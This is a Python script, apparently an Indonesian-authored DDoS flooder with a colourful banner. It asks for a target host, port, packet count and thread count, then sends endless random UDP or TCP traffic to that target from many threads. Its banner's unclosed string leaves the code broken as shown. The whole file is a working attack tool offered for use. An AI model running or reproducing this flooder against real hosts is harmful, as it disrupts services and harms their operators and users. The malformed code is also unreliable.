import random
import socket
import threading
import os
import sys
import struct
import time
import codecs


os.system("clear")

print("""\033[95m 
  ________  ____ ___    _    _  __  _  ____        __ __     ______  
   _______  ____ ___    _    _  __  _  ____        __ __     ___
/ | | | | | | | | | | | | | | | | | | | | | | | | | | | | 
/033[93m \---/\---/\---/\---/\---/\---/\---/\---/
/____\/____\/____\/____\/____\/____\/____/033[92m__/
/ \_/\_/\_/\_/\_/\_/\_/\_/\_/\_/ 
/ ____\/____\/____\/____\/____\/____\/____                                                               
/ | | | | | | | | | | | | | | | | | | | | | | | | | | | |
_______  ____ ___    _    _  __  _  ____        __ __     ___
                                                                     

print("\033[95m HOAX HOAX HOAX. \033[95m")
ip = str(input(" \033[91mHost/Ip:"))
port = int(input(" \033[93mPort:"))
choice = str(input(" \033[94m(y/n):"))
times = int(input(" \033[92mPackets :"))
threads = int(input(" \033[96mThreads:"))

os.system("clear")

def  type(s):
        for c in s  +  '\n' :
              sys.stdout.write( c )
              sys.stdout.flush( )
              time.sleep(0.002)
              
              
type("""
\033[93mDari Abu Hurairah bahwa Nabi saw. bersabda: â€œJauhilah hasad (dengki), karena hasad dapat memakan kebaikan seperti api memakan kayu bakar.â€ (HR Abu Dawud). Kedengkian 

\033[91m WAHAI ENGKAU MANUSIA JANGAN LAH ENGKAU DDOS SERVER YANG TIDAK BERSALAH """)


def run():
	data = random._urandom(577)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" ZODIAK ATTACK KW!!!")
		except:
			print("[!] \033[95mWKWKWK \033[94mKOK \033[91mTEMBUS?!!")

def run2():
	data = random._urandom(577)
	i = random.choice(("[2]","[1]","[3]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" \033[92mZODIAK \033[91mATTACK \033[94mKW!!!")
		except:
			s.close()
			print("\033[92m] EROR \033[93m] ANJER")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
else:
		th = threading.Thread(target = run2)
		th.start()